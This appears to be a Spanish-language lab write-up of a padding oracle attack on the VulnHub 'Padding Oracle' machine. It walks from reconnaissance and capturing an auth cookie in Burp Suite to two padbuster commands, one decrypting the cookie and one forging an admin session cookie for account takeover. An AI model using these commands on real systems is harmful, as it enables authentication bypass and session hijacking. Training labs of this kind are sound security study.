Para explotar esta vulnerabilidad, podemos usar la máquina padding oracle de vulnhub:
![[Pasted image 20230706155433.png]]
Lo instalamos en máquina virtual y lo ejecutamos:
![[Pasted image 20230706155550.png]]
Y aquí encontramos la IP de la máquina víctima:
![[Pasted image 20230706155647.png]]
Hacemos un breve reconocimiento y vemos que tiene el puerto 80 abierto:
![[Pasted image 20230706155909.png]]
Y vemos un servicio HTTP en funcionamiento:
![[Pasted image 20230706160018.png]]
Probamos en registrarnos tal y como nos dice la web:
![[Pasted image 20230706160612.png]]
![[Pasted image 20230706160631.png]]
Ahora vamos a salir de este login y volvemos al panel de logueo, donde vamos a volver a interceptar la petición con burpsuite (recargando la página) y en burpsuite tenemos una cookie de autenticación:
![[Pasted image 20230706161456.png]]
Y ahora con este código, podemos intentar descifrarlo con una herramienta llamada padbuster, poniendo estos parámetros y con un 8, aunque se pueden ir probando con distintos números:
```bash
padbuster http://192.168.0.24/login.php %2FPJNmlW69vb8ApskVyrsLcNkjBTilTNm 8 --cookies auth=%2FPJNmlW69vb8ApskVyrsLcNkjBTilTNm -encoding 0
```
![[Pasted image 20230706161721.png]]
Y al ejecutarlo nos pregunta, esto, donde nos recomiendan poner el 2, que es lo que pondremos:
![[Pasted image 20230706161853.png]]
Y nos ha descifrado el usuario:
![[Pasted image 20230706161923.png]]
## Obteniendo cookie de sesión de un usuario
Una vez hayamos hecho esto, podremos también obtener una cookie de sesión de algún usuario registrado en el sistema, por ejemplo del usuario admin, por lo que utilizaremos estos otros parámetros:
```bash
padbuster http://192.168.0.24/login.php %2FPJNmlW69vb8ApskVyrsLcNkjBTilTNm 8 --cookies auth=%2FPJNmlW69vb8ApskVyrsLcNkjBTilTNm -encoding 0 -plaintext 'user=admin'
```
Y nos habrá generado una cookie de sesión para el usuario admin:
![[Pasted image 20230706162314.png]]
Por tanto ahora vamos a pegar esta cookie dentro del navegador:
![[Pasted image 20230706162411.png]]
Recargamos la página y seremos el usuario admin:
![[Pasted image 20230706162456.png]]

